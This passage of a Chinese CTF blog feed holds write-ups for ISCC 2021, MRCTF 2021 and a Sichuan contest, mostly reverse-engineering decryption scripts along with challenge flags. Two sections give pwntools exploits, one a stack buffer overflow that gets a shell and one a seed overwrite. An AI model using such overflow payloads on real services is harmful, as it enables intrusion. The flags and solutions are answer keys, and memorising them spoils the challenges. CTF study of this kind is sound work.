&#125;&#125;//zMXHz3S4mteXnwu1nZHImwmXotzImZq2zJC5ywfLotyXyZqWy30=</code></pre><p>变表base解密</p><pre><code>import base64import stringstr1 = &#39;zMXHz3S4mteXnwu1nZHImwmXotzImZq2zJC5ywfLotyXyZqWy30=&#39;string1 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&#39;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;print(base64.b64decode(str1.translate(str.maketrans(string1, string2))))</code></pre><h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;81115e578b1c196b346f79aae961c40c&#125;</span><br></pre></td></tr></table></figure><h3 id="题目十-2021年四川省大学生网络安全技能大赛问卷调查"><a href="#题目十-2021年四川省大学生网络安全技能大赛问卷调查" class="headerlink" title="题目十 2021年四川省大学生网络安全技能大赛问卷调查"></a>题目十 2021年四川省大学生网络安全技能大赛问卷调查</h3><h3 id="操作内容：-8"><a href="#操作内容：-8" class="headerlink" title="操作内容："></a>操作内容：</h3><p>有手就行</p><h3 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本:"></a>脚本:</h3><p>无</p><h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag:"></a>flag:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ZWNkeHNjdGZpc2cwMGQ&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 ISCC re和签到pwn wp</title>
      <link href="2021/05/06/2021%20ISCC%E9%80%86%E5%90%91wp%E5%92%8C%E7%AD%BE%E5%88%B0pwn/"/>
      <url>2021/05/06/2021%20ISCC%E9%80%86%E5%90%91wp%E5%92%8C%E7%AD%BE%E5%88%B0pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="2021-ISCC逆向wp和签到pwn"><a href="#2021-ISCC逆向wp和签到pwn" class="headerlink" title="2021 ISCC逆向wp和签到pwn"></a>2021 ISCC逆向wp和签到pwn</h1><p>前言：五一来打的这个比赛，上题是分批次的，后面要军训了，难受。这个比赛好像是说原题很多，也不知道了，反正没做过。不得不说，这个比赛py有点多，哈哈哈。</p><h2 id="Garden"><a href="#Garden" class="headerlink" title="Garden"></a>Garden</h2><p>签到题，pyc用uncompyle6反编译一下，得到py文件，分析一波就是一个异或。<br><img src="https://i.loli.net/2021/05/03/lutWUiHVSMNcy6P.png"><br>写出脚本</p><pre><code>l=&#39;2(88\x006\x1a\x10\x10\x1aIKIJ+\x1a\x10\x10\x1a\x06&#39;for i in l:    print(chr(ord(i)^123),end=&#39;&#39;)//ISCC&#123;Makka2021Pakka&#125;</code></pre><h2 id="Mobile-Easy"><a href="#Mobile-Easy" class="headerlink" title="Mobile Easy"></a>Mobile Easy</h2><p>安卓逆向，比较坑的是有一个字符代换，交了半天都不对，模拟器里面又是right。</p><p>先主函数分析一波<br><img src="https://i.loli.net/2021/05/03/eK1Z2I97HkmugTl.png"><br>然后分析secondStr，发现是aes的ECB模式<br><img src="https://i.loli.net/2021/05/03/LFsVgOJYA6CRK3e.png"><br>没找到好的脚本，自己写的那个好像不行，哈哈哈，还是线上解吧<a href="https://the-x.cn/cryptography/Aes.aspx">https://the-x.cn/cryptography/Aes.aspx</a><br><img src="https://i.loli.net/2021/05/03/MYzyu12I4GRH5OV.png"><br>然后thirdStr，解就行了<br><img src="https://i.loli.net/2021/05/03/TW7n12EecCZqQGK.png"><br>算出来是：Gg9hwlTP</p><p>然后就是replace了</p><pre><code>s=&#39;+0dNlE8us8&#39;l=[71,103,57,104,119,108,84,80]for i in l:    s+=chr(i)s=&#39;ISCC&#123;&#39;+s+&#39;&#125;&#39;print(s.replace(&quot;dN&quot;,&quot;B1&quot;).replace(&quot;8&quot;,&quot;_&quot;).replace(&quot;P&quot;,&quot;!&quot;).replace(&quot;hwl&quot;,&quot;rea&quot;).replace( &#39;u&#39;,&#39;1&#39;).replace(&quot;+&quot;,&quot;m&quot;))//ISCC&#123;m0B1lE_1s_Gg9reaT!&#125;</code></pre><h2 id="无法注册的程序"><a href="#无法注册的程序" class="headerlink" title="无法注册的程序"></a>无法注册的程序</h2><p>一个MFC程序，无法点确定，意味着无法输入字符串，但是我们仍然可以找到检验的位置。</p><p>我这里是通过shift+12看字符串定位到check函数的。可以看到字符串里面有part1，part2，b64out，tea_ptr，keyhint这些，通过他们，然后交叉引用就可以找到check函数。而且这些字符串也是算法的提示。</p><p>找到check函数就是，sub_5A1080<br><img src="https://i.loli.net/2021/05/03/CptMT7YhOiB4rUu.png"><br>但是在开始做前，里面有两个提前调用的函数，需要注意，会修改数据。<br><img src="https://i.loli.net/2021/05/03/uz3HVvSMpdWRsm4.png"><br>找到这两个函数，试着打断点，还真断下来了</p><p>第一个函数<br><img src="https://i.loli.net/2021/05/03/H1eXo3Ugr7xVhNy.png"><br>第二个函数，处理密文<br><img src="https://i.loli.net/2021/05/03/zoGjCFNPbRMQta2.png"><br>这时候就有两个思路了，写idapython来还原，或者直接将就动调，在执行完这两个函数后，再去看check函数。</p><p>这里我是直接写了两个idapython，用的时候注意地址就行了。</p><pre><code>import idcst = 0x545018i = 0s=&#39;fuck&#39;print(len(s))while st &lt; 0x545018+0x2c:    value = ida_bytes.get_byte(st)    value ^= ord(s[i%len(s)])    ida_bytes.patch_byte(st, value)    st += 1    i += 1import idcst = 0x545188i = 0s=&#39;you_can_not_find_me&#39;print(len(s))while st &lt; 0x545188+0x292:    value = ida_bytes.get_byte(st)    value ^= ord(s[i%len(s)])    ida_bytes.patch_byte(st, value)    st += 1    i += 1</code></pre><p>接下来就可以看check函数了。</p><p>第一部分<br><img src="https://i.loli.net/2021/05/03/fixN4QXmIhy37Pz.png"><br>进入rc4函数部分，这里我直接用动调提出了初始化秘钥后的s，因为写脚本不知道哪出问题了，就直接动调提数据算了。动调就在sub_BCDDC0函数开头，右键点set ip就行。<br><img src="https://i.loli.net/2021/05/03/3XKwDnamoFUxGVO.png"><br>这样就得到了初始化后的s，解密也用这个s就行了。</p><p>接下来看base64<br><img src="https://i.loli.net/2021/05/03/OSvD7CMZIRUymAi.png"></p><pre><code>import base64code=[0x04, 0x48, 0x4D, 0x25, 0x0F, 0x4E, 0x45, 0x58, 0x0C, 0x37,  0x39, 0x50, 0x62, 0x4E, 0x5C, 0x43, 0x0F, 0x42, 0x51, 0x4C,  0x76, 0x53, 0x57, 0x2C, 0x0A, 0x2F, 0x27, 0x38, 0x74, 0x23,  0x55, 0x4D, 0x63, 0x34, 0x25, 0x45, 0x67, 0x40, 0x40, 0x40,  0x0C, 0x2E, 0x25, 0x35]t=[]for i in code:    t.append((i-35)&amp;0x3f)base1 = [0x0,0x1,0x2,0x3,0x4,0x5,0x6,0x7,0x8,0x9,0xa,0xb,0xc,0xd,0xe,0xf,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20,0x21,0x22,0x23,0x24,0x25,0x26,0x27,0x28,0x29,0x2a,0x2b,0x2c,0x2d,0x2e,0x2f,0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x3a,0x3b,0x3c,0x3d,0x3e,0x3f]base = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;ans = &#39;&#39;for i in t:    ans += base[base1.index(i)]print(ans)str=base64.b64decode(ans)print(base64.b64decode(ans))for i in str:    print(hex(i),end=&#39;,&#39;)//0x86,0x5a,0x82,0xb2,0xb8,0xb5,0xa5,0x45,0xad,0xfe,0xbe,0x60,0xb1,0xfb,0xa9,0x4f,0xd,0x9,0x9c,0xc1,0x15,0x44,0xc,0xaa,0x1,0x10,0xa2,0x11,0xd7,0x5d,0xa4,0xb0,0x92</code></pre><p>然后rc4解密，注意类型</p><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;typedef unsigned longULONG;void rc4_crypt(unsigned char*s, int*Data, unsigned long Len)&#123;    int i = 0, j = 0, t = 0;    unsigned long k = 0;    unsigned char tmp;    for (k = 0; k&lt;Len; k++)    &#123;        i = (i + 1) % 256;        j = (j + s[i]) % 256;        tmp = s[i];        s[i] = s[j];//交换s[x]和s[y]        s[j] = tmp;        t = (s[i] + s[j]) % 256;        Data[k] ^= s[t];    &#125;&#125;int main()&#123;    unsigned char s2[256] = &#123;   0x53, 0xBF, 0x82, 0x49, 0x3A, 0x08, 0xE0, 0xFD, 0x8A, 0xBB,   0x44, 0xC7, 0xC4, 0x99, 0x06, 0x3C, 0xC2, 0x80, 0x68, 0xCF,   0x51, 0x5B, 0xDC, 0x8C, 0x76, 0xB4, 0xBE, 0x62, 0x0F, 0x32,   0xEA, 0x7A, 0xFC, 0x83, 0xD9, 0x63, 0xDB, 0xC9, 0xF7, 0xC6,   0xD4, 0x6C, 0xCB, 0xAF, 0xE9, 0xB3, 0x8B, 0x7E, 0xF5, 0xA1,   0x30, 0xB0, 0xBA, 0x92, 0xDA, 0x9F, 0x43, 0x89, 0x1A, 0x9E,   0x59, 0x6F, 0xE7, 0xD8, 0x74, 0x38, 0x42, 0x12, 0x5A, 0xA0,   0xAD, 0x04, 0x3F, 0x4F, 0xED, 0xB7, 0x4D, 0x95, 0x34, 0x1D,   0x0C, 0xB5, 0x60, 0x0B, 0x6D, 0x5C, 0xE5, 0xA2, 0x05, 0xF9,   0x2C, 0xC8, 0xEB, 0xD3, 0x81, 0x2E, 0x02, 0x73, 0xF0, 0xF3,   0x94, 0xEC, 0x2D, 0xF6, 0x97, 0xB1, 0x7B, 0xC1, 0xA5, 0x2F,   0x6A, 0x47, 0x07, 0x85, 0xB8, 0xBD, 0x18, 0xCA, 0x5E, 0x96,   0x8E, 0xF2, 0xE8, 0x40, 0x71, 0xFF, 0x5D, 0xCD, 0xE3, 0x37,   0xE1, 0x4B, 0xFE, 0xD1, 0x75, 0x03, 0x45, 0x87, 0x66, 0x52,   0x31, 0x8D, 0x4C, 0xB2, 0x9B, 0x39, 0x16, 0x01, 0xAB, 0x54,   0x90, 0x98, 0x2B, 0xF4, 0xA7, 0x0A, 0x35, 0x27, 0x0D, 0x61,   0xA4, 0xA8, 0x6B, 0x48, 0x41, 0x86, 0x23, 0x0E, 0x56, 0x58,   0x46, 0x22, 0xDD, 0x50, 0x79, 0xB6, 0x9D, 0xD7, 0x93, 0x29,   0x77, 0x88, 0xAC, 0xEE, 0x3B, 0x26, 0x28, 0x3E, 0x24, 0x84,   0x67, 0xBC, 0x36, 0x78, 0x4E, 0x21, 0x1B, 0x1E, 0x33, 0xCC,   0x19, 0x5F, 0x25, 0x70, 0x55, 0x09, 0x20, 0xB9, 0xA9, 0xE4,   0x8F, 0x7C, 0x65, 0x14, 0xD0, 0xFA, 0x7F, 0x6E, 0x69, 0x10,   0x57, 0xDF, 0xAA, 0xAE, 0xA3, 0x17, 0x1F, 0x64, 0x1C, 0x72,   0xFB, 0xDE, 0xC3, 0x3D, 0x11, 0x2A, 0x15, 0xC0, 0xF1, 0x00,   0xEF, 0xCE, 0xC5, 0x91, 0xA6, 0x9C, 0x13, 0xD2, 0xD5, 0xE2,   0x7D, 0xD6, 0xF8, 0x4A, 0x9A, 0xE6 &#125;;//S-box    char key[256] = &#123; &quot;sorry_you_are_wrong&quot; &#125;;    int pData[256] = &#123;0x86,0x5a,0x82,0xb2,0xb8,0xb5,0xa5,0x45,0xad,0xfe,0xbe,0x60,0xb1,0xfb,0xa9,0x4f,0xd,0x9,0x9c,0xc1,0x15,0x44,0xc,0xaa,0x1,0x10,0xa2,0x11,0xd7,0x5d,0xa4,0xb0,0x92&#125;;    int i;    rc4_crypt(s2, pData, 33);    for(i=0;i&lt;33;i++)    &#123;        printf(&quot;%c&quot;,pData[i]%128);    &#125;    return 0;&#125;//Fr4nk1y_MfC_l5_t0O_ComPIeX_4nd_dl</code></pre><p>第二部分，改了dealt的tea解密<br><img src="https://i.loli.net/2021/05/03/SoPMKvfdlN31Dzq.png"><br>先用z3来解密文</p><pre><code>from z3 import *s = Solver()flag = [BitVec(&#39;flag[%d]&#39; % i, 64) for i in range(3)]s.add(flag[1]-flag[0]==0x3F66B755B4490579)s.add(flag[0]+flag[2]==0x162F924623D2CAE0)s.add(flag[2]-flag[1]==0x7C3C71F1B295D77F)print(s.check())m = s.model()print(m)print(hex(3262352701727045364),hex(7830893152465779821),hex(16783048594668704748))//v7=0x2d46347f5e79f6f4 v10=0x6cacebd512c2fc6d v11=0xe8e95dc6c558d3ec</code></pre><p>然后tea解密，dealt是0x2433B95A，注意每轮key不一样</p><pre><code>#include&lt;stdio.h&gt;void decrypt(unsigned int *code , int *key)&#123;    unsigned int delta=0x2433B95A,sum=0x2433B95A*32;    unsigned int v0,v1,i;    v0=code[0];    v1=code[1];    for(i=0;i&lt;32;i++)    &#123;        v1-=( (v0&lt;&lt;4)+key[2] ) ^ (v0+sum) ^ ( (v0&gt;&gt;5)+key[3] );        v0-=( (v1&lt;&lt;4)+key[0] ) ^ (v1+sum) ^ ( (v1&gt;&gt;5)+key[1] );        sum-=delta;    &#125;    code[0]=v0;    code[1]=v1;&#125;int main()&#123;    int key[4]=&#123;0x0DCDEDAE8,0x0EAD2D1A0, 0x0BAC4F564, 0x0DA4772AC&#125;;    unsigned int code[2]=&#123;0xe8e95dc6,0xc558d3ec&#125;;    int i;    decrypt(code,key);    for(i=0;i&lt;2;i++)    &#123;        printf(&quot;%c%c%c%c&quot;, *((char*)&amp;code[i])&amp;0xff,*((char*)&amp;code[i] + 1)&amp;0xff,*((char*)&amp;code[i] + 2)&amp;0xff,*((char*)&amp;code[i]+3)&amp;0xff);     &#125; &#125;//5f1cUlt_foR_THe_r0Ok1E_t0_REver5e</code></pre><p>拼接一下，得到ISCC{Fr4nk1y_MfC_l5_t0O_ComPIeX_4nd_dl5f1cUlt_foR_THe_r0Ok1E_t0_REver5e}</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>简单的逆向题，逻辑很清晰</p><p>IDA打开<br><img src="https://i.loli.net/2021/05/10/VefLYd6A9n8KsyQ.png"></p><p>脚本</p><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123;    char flag[26]=&#123;0x43,0xDF,0x14,3,0xD,0x2C,9,1,0x17,0x17,8,0xFC,0x2B,0xFA,0x14,0x17                    ,0xF9,0x25,0xF5,0x22,0x3D,0xCE,0x18,0x16,0xA,&#39;\0&#39;&#125;;    int i;    int mid;    char key[8]=&quot;REVERSE&quot;;    for(i=0;i&lt;strlen(key);i++)    &#123;        key[i]%=64;    &#125;    for(i=0;i&lt;25;i++)    &#123;        if(key[i%7]&amp;1!=0)        &#123;            flag[i]=flag[i]-2;        &#125;        else        &#123;            flag[i]=flag[i]-1;        &#125;     &#125;      for(i=0;i&lt;25/2;i++)     &#123;         mid=flag[i];         flag[i]=flag[24-i];         flag[24-i]=mid;     &#125;     for(i=0;i&lt;25;i++)     &#123;         flag[i]-=key[i%7];     &#125;     for(i=24;i&gt;=0;i--)     &#123;         flag[i]=flag[i]+flag[i+1];     &#125;     for(i=0;i&lt;25;i++)     &#123;         flag[i]+=64;         printf(&quot;%c&quot;,flag[i]);     &#125;&#125;//ISCC&#123;REVERSE_IS_NOT_HARD&#125;</code></pre><h2 id="Greedy-Snake"><a href="#Greedy-Snake" class="headerlink" title="Greedy Snake"></a>Greedy Snake</h2><p>擂台赛的一道题，upx加壳了，手动脱壳。游戏想用ce来做的，结果改了相应判断地址数据后发现</p><p><img src="https://i.loli.net/2021/05/12/xS9uysqGzwYv5r7.png"><br>好家伙，上当了。</p><p>ida看逻辑<br><img src="https://i.loli.net/2021/05/12/5VkAryupnDgEv1U.png"><br>脚本1</p><pre><code>import base64url = &quot;QFpKSnJWXFlRKFY8PFY8OVY8MVY9Z21WSz08bCJROVt0&quot;str_url = base64.b64decode(url)print(str_url)//@ZJJrV\\YQ(V&lt;&lt;V&lt;9V&lt;1V=gmVK=&lt;l\&quot;Q9[t</code></pre><p>脚本2</p><pre><code>#include&lt;stdio.h&gt;int main()&#123;    char flag[]=&quot;@ZJJrV\\YQ(V&lt;&lt;V&lt;9V&lt;1V=gmVK=&lt;l\&quot;Q9[t&quot;;    int i,j;    for(i=1;i&lt;=10;i++)    &#123;        for(j=0;j&lt;33 ;j++)        &#123;            if(33%i)                flag[j]^=i;            else                flag[j]^=j;        &#125;    &#125;        for(i=0;i&lt;33;i++)    &#123;        printf(&quot;%c&quot;,flag[i]);     &#125;&#125;//ISCC&#123;_UPX!_55_50_58_4nd_B45e+X0R&#125;</code></pre><h2 id="Ron’s-Code"><a href="#Ron’s-Code" class="headerlink" title="Ron’s Code"></a>Ron’s Code</h2><p>rc4加密，加密前对flag和key进行了一些简单处理<br><img src="https://i.loli.net/2021/05/19/MFwx4K8dC2DfeY9.png"></p><p>脚本</p><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;typedef unsigned longULONG;void rc4_init(unsigned char*s, unsigned char*key, unsigned long Len)&#123;    int i = 0, j = 0;    char k[256] = &#123; 0 &#125;;    unsigned char tmp = 0;    for (i = 0; i&lt;256; i++)    &#123;        s[i] = i;        k[i] = key[i%Len];    &#125;    for (i = 0; i&lt;256; i++)    &#123;        j = (j + s[i] + k[i]) % 256;        tmp = s[i];        s[i] = s[j];        s[j] = tmp;    &#125;&#125;void rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len)&#123;    int i = 0, j = 0, t = 0;    unsigned long k = 0;    unsigned char tmp;    for (k = 0; k&lt;Len; k++)    &#123;        i = (i + 1) % 256;        j = (j + s[i]) % 256;        tmp = s[i];        s[i] = s[j];        s[j] = tmp;        t = (s[i] + s[j]) % 256;        Data[k] ^= s[t];    &#125;&#125;int main()&#123;    unsigned char s[256] = &#123; 0 &#125;, s2[256] = &#123; 0 &#125;;    char key[256] = &#123; &quot;ITEF6588&quot; &#125;;    char key1[9]=&quot;ISCC2021&quot;;    char flag[512] = &#123;0xE8,0x30,0xE8,0x30,0xC9,0x65,0xA9,0xBA,0x77,0xDA,0xF4,0x4E,0xE3,0xE9,0x60,0x76,0xC1&#125;;    unsigned long len = strlen(flag);    int i;    rc4_init(s, (unsigned char*)key, strlen(key));    for (i = 0; i&lt;256; i++)    &#123;        s2[i] = s[i];    &#125;    rc4_crypt(s2, (unsigned char*)flag, len);    for(i=0;i&lt;0x11;i++)    &#123;        flag[i]+=key1[i%8]-1;        printf(&quot;%c&quot;,flag[i]);    &#125;    return 0;&#125;//ISCC&#123;reverse_rc4&#125;</code></pre><h2 id="汇编大人，时代变了"><a href="#汇编大人，时代变了" class="headerlink" title="汇编大人，时代变了"></a>汇编大人，时代变了</h2><p>文件是一个ll文件，llvm，先转为可执行文件</p><pre><code>llc -filetype=obj task.ll -o task.ogcc task.o</code></pre><p>然后ida分析<br><img src="https://i.loli.net/2021/05/26/WNF8pxawcQCjyZd.png"><br>爆破脚本</p><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;//mAy6e_t0d4Y_7H15_ls_tH3_10n8est_f14g_Y0_HaD_Ev3R_5e3n!int main(void)&#123;    int i,j;    char what[]=&#123;  0x64, 0x4E, 0x6C, 0x2E, 0x1E, 0x36, 0x38, 0x04, 0x44, 0x12,   0x1C, 0x24, 0x5C, 0x59, 0x3D, 0x0B, 0x5A, 0x78, 0x08, 0x09,   0x76, 0x70, 0x79, 0x33, 0x13, 0x16, 0x20, 0x7E, 0x6B, 0x23,   0x36, 0x45, 0x07, 0x11, 0x2C, 0x22, 0x4A, 0x4A, 0x4F, 0x2E,   0x48, 0x4C, 0x7C, 0x3E, 0x11, 0x0F, 0x6A, 0x18, 0x37, 0x42,   0x1E, 0x2B, 0x12, 0x03, 0x5A, 0x47&#125;;      char secret[]=&#123;0x42, 0x0A, 0x7C, 0x5F, 0x22, 0x06, 0x1B, 0x67, 0x37, 0x23,   0x5C, 0x46, 0x0A, 0x29, 0x09, 0x30, 0x51, 0x38, 0x5F, 0x7B,   0x59, 0x13, 0x18, 0x0D, 0x50&#125;;      char flag[64]=&#123;0&#125;;      char v4;      for(i=0;i&lt;127;i++)      &#123;          flag[0]=i;          for(j=1;j&lt;strlen(what);j++)        &#123;              flag[j]=flag[j-1]^what[j-1];        &#125;        for(j=0;j&lt;57;j++)        &#123;            v4=flag[j]^secret[j%strlen(secret)];            printf(&quot;%c&quot;,v4);        &#125;        printf(&quot;\n&quot;);    &#125;&#125;//mAy6e_t0d4Y_7H15_ls_tH3_10n8est_f14g_Y0_HaD_Ev3R_5e3n_!</code></pre><h2 id="秘笈"><a href="#秘笈" class="headerlink" title="秘笈"></a>秘笈</h2><p>一个易语言写的程序，感觉难点就在于，你需要知道这个程序可以进行输入，这个可以通过你使用键盘时发现一些键无法使用了。这也导致我写wp都不好写了。。。</p><p>然后xdbg分析，通过搜索字符串可知，关键就在于3个地方。<br><img src="https://i.loli.net/2021/05/26/RF2ueVrshvpQfEM.png"><br>eax，是我们键盘按键所产生的数，然后会和下面地址的数进行比较，并且有一个计数器来判断，正确了几个了。</p><p>实际上就是，魂斗罗的圣经↑↑↓↓←→←→BABA。我是改的每次的eax值，懒得去记录哪个键代表哪个数值了。会弹出下面的窗口。<br><img src="https://i.loli.net/2021/05/26/CBaNAMUziyHqZd8.png"></p><p>然后后面两个判断也差不多是这样。<br><img src="https://i.loli.net/2021/05/27/Mf8zKPuX6ax4bnV.png"><br>键盘输入是wankkoree，也就是作者名字。会弹出下面的窗口。<br><img src="https://i.loli.net/2021/05/27/9kA6K8Gd13V7b4e.png"></p><p>然后就是一个进度条，输入对了进度条就会涨，错了就从新来。<br><img src="https://i.loli.net/2021/05/27/M9rblgEkOHIuh5e.png"><br>最后弹出flag窗口<br><img src="https://i.loli.net/2021/05/27/ODeATaWhmB4So8p.png"></p><h2 id="cxi"><a href="#cxi" class="headerlink" title="cxi"></a>cxi</h2><p>一个3ds的抓包后的文件，要用3dstools来解包。暂时没安装好这个，后面需要的话来补。</p><h2 id="M78"><a href="#M78" class="headerlink" title="M78"></a>M78</h2><p>最近刚学了点pwn，看着是签到题来做了做，考点就是一个整数溢出漏洞吧，就是对于一个类型确定的变量，比如说unsigned char，8bit，下面的两个数就是相等的。</p><p><a href="https://postimg.cc/sGv6qJfp"><img src="https://i.postimg.cc/ZnLG9f1D/Snipaste-2021-05-06-19-54-14.png" alt="Snipaste-2021-05-06-19-54-14.png"></a></p><p>下面来看看逻辑</p><p><a href="https://postimg.cc/zVNHdGdf"><img src="https://i.postimg.cc/J4D3zyZj/Snipaste-2021-05-06-19-58-21.png" alt="Snipaste-2021-05-06-19-58-21.png"></a></p><p>exp</p><pre><code>#! /usr/bin/python3from pwn import *io = process(&#39;./M78&#39;)#io=remote(&quot;39.96.88.40&quot;,&#39;7010&#39;)#gdb.attach(io,&#39;b *0x080492B0&#39;)io.recvuntil(&quot;choice?&quot;)io.sendline(&quot;1&quot;)io.recvuntil(&quot;building&quot;)io.sendline(&quot;1&quot;)io.recvuntil(&quot;password&quot;)payload = b&#39;a&#39;*0x18 +b&#39;a&#39;*4+ p32(0x08049202)+b&#39;a&#39;*230io.sendline(payload)io.interactive()</code></pre><p>getshell，catflag</p><pre><code>flag&#123;N@x_addr_*EnaBleD%&#125;</code></pre><p><a href="https://postimg.cc/4mny2H6s"><img src="https://i.postimg.cc/gkHhJvrX/Snipaste-2021-05-06-20-00-16.png" alt="Snipaste-2021-05-06-20-00-16.png"></a></p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>一个猜数字的题，考察的就是rand()和srand()函数，如果seed设为1，那么rand产生的数组就是一个确切的数组。</p><p>大概逻辑<br><img src="https://i.loli.net/2021/05/11/5ek87mZEYtayKMi.png"><br>动调看cmp部分<br><img src="https://i.loli.net/2021/05/11/a82EvPfCUnHz74S.png"></p><p>exp</p><pre><code>from pwn import *from ctypes import *io = process(&#39;./game&#39;)#io=remote(&quot;39.96.88.40&quot;,&#39;7040&#39;)gdb.attach(io)elf=ELF(&#39;./game&#39;)io.recvuntil(&quot;Your name is :&quot;)payload=b&#39;a&#39;*(0x30-0x10)+p64(0x0)+p32(0x1)io.sendline(payload)a=[&#39;55&#39;,&#39;15&#39;,&#39;82&#39;,&#39;1&#39;,&#39;98&#39;,&#39;68&#39;,&#39;67&#39;,&#39;15&#39;,&#39;86&#39;,&#39;3&#39;]for i in a:    io.recvuntil(&quot;Guess Number:&quot;)    io.sendline(i)io.interactive()//ISCC&#123;this****&amp;haobdvaljdnvoa0%bor&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mrctf</title>
      <link href="2021/04/15/mrctf%E7%9A%84wp/"/>
      <url>2021/04/15/mrctf%E7%9A%84wp/</url>
      
        <content type="html"><![CDATA[<h1 id="mrctf的wp"><a href="#mrctf的wp" class="headerlink" title="mrctf的wp"></a>mrctf的wp</h1><p>后面来做的题。做了2道半，后面就是看wp学习了，复现了5道，学到了很多新知识，其他人wp写的很详细，就不贴图片了，太懒了。</p><p><strong>其他人的wp</strong></p><p><a href="https://www.anquanke.com/post/id/237793">官方</a></p><p><a href="https://usher2008.github.io/2021/04/11/MRCTF%202021/#MRCTF-2021">usher</a></p><p><a href="http://blog.wjhwjhn.com/archives/220/">wjh</a></p><p><a href="https://bbs.pediy.com/thread-267013.htm#msg_header_h3_4">bxb0</a></p><h2 id="real-signIn"><a href="#real-signIn" class="headerlink" title="real_signIn"></a>real_signIn</h2><p>变表base</p><pre><code>import base64import stringstr1 = &quot;tvjdvez7D0vSyZbnzv90mf9nuKnurL8YBZiXiseHFq==&quot;string1 = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))# MRCTF&#123;wElc0Me_t0_MRCTF_2o21!!!&#125;</code></pre><h2 id="dynamic-debug"><a href="#dynamic-debug" class="headerlink" title="dynamic_debug"></a>dynamic_debug</h2><p>动调就可以看到整个大致过程了，是tea加密</p><p>tea加密</p><pre><code>//  0x99, 0xA1, 0x85, 0x55, 0x68, 0x5D, 0x82, 0x7E, 0x39, 0x00, //  0x4D, 0x94, 0x43, 0x69, 0x72, 0x71, 0x06, 0x43, 0x51, 0x6A, //  0x00, 0xAD, 0x14, 0x4B, 0x3F, 0x0D, 0xD2, 0x64, 0x15, 0xDB, //  0x37, 0x9F//MRCTF&#123;aaaaaaaaaaaaaaaaaaaaaaaaa&#125;//0x5585A199, 0x7E825D68 944D0039 71726943 6A514306 4B14AD00 64D20D3F 9F37DB15#include&lt;stdio.h&gt;void decrypt(unsigned int *code , unsigned int *key)&#123;    unsigned int delta=0x9e3779b9;    unsigned int v0,v1,sum=delta*32,i;// sum=0xC6EF3720    v0=code[0];    v1=code[1];    for(i=0;i&lt;32;i++)    &#123;        v1-=( (v0&lt;&lt;4)+key[2] ) ^ (v0+sum) ^ ( (v0&gt;&gt;5)+key[3] );        v0-=( (v1&lt;&lt;4)+key[0] ) ^ (v1+sum) ^ ( (v1&gt;&gt;5)+key[1] );        sum-=delta;    &#125;    code[0]=v0;    code[1]=v1;    for(i=0;i&lt;2;i++)    &#123;        printf(&quot;%c%c%c%c&quot;, *((char*)&amp;code[i])&amp;0xff,*((char*)&amp;code[i] + 1)&amp;0xff,*((char*)&amp;code[i] + 2)&amp;0xff,*((char*)&amp;code[i]+3)&amp;0xff);    &#125;&#125;//0x944D0039, 0x71726943, 0x6A514306, 0x4B14AD00, 0x64D20D3F, 0x9F37DB15int main()&#123;    int i;    unsigned int key[4]=&#123;0x6B696C69,0x79645F65,0x696D616E,0x67626463&#125;;    unsigned int code[8]=&#123;0x5585A199, 0x7E825D68,0x944D0039,0x71726943,0x6A514306,0x4B14AD00,0x64D20D3F,0x9F37DB15&#125;;    for(i=0;i&lt;8;i+=2)    &#123;        decrypt(code+i,key);    &#125;&#125;//MRCTF&#123;Dyn4m1c_d3buG_1s_a_ki11eR&#125;</code></pre><h2 id="MR-CheckIN"><a href="#MR-CheckIN" class="headerlink" title="MR_CheckIN"></a>MR_CheckIN</h2><p>md5</p><pre><code>f5e69f42b7a9a0f1c9edede743a1d27f//Andr01d</code></pre><p>得到MRCTF{Andr01d+xxxx}</p><p>part2</p><p>是一个异或暂时不知道怎么动调so文件，后来知道了，现在补齐</p><p>进行一些环境配置，我用的雷电模拟器<br><a href="https://usher2008.github.io/2021/03/21/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/#usb%E8%BF%9E%E6%8E%A5">https://usher2008.github.io/2021/03/21/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/#usb%E8%BF%9E%E6%8E%A5</a></p><p>在jeb中打断点ctrl+b<br><img src="https://i.loli.net/2021/05/24/a1ShiDuk7LAJMnN.png"></p><p>然后在模拟器中打开apk，然后开始连接<br><img 